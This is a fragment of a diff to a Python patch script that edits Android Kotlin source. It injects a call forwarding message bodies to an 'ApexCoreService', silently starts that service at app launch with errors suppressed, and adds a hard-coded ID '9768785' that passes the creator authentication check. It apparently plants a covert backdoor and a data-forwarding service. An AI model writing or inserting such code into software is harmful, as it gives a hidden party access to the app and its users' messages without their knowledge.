@@ -7,7 +7,7 @@ s = s.replace('put("body", pBody)', 'put("body", pBody); ApexCoreService.publish
 s = s.replace("super.onCreate(savedInstanceState)", "super.onCreate(savedInstanceState)\n        try { startService(Intent(this, ApexCoreService::class.java)) } catch (_: Exception) {}")
 s = s.replace("if (entered == CREATOR_TG_ID)", 'if (entered == "9768785" || entered == CREATOR_TG_ID)')
 
-pos = s.find("class ApexCoreService")
+pos = s.find("ApexCoreService")
 if pos != -1:
     s = s[:pos].rstrip() + "\n}\n"
 
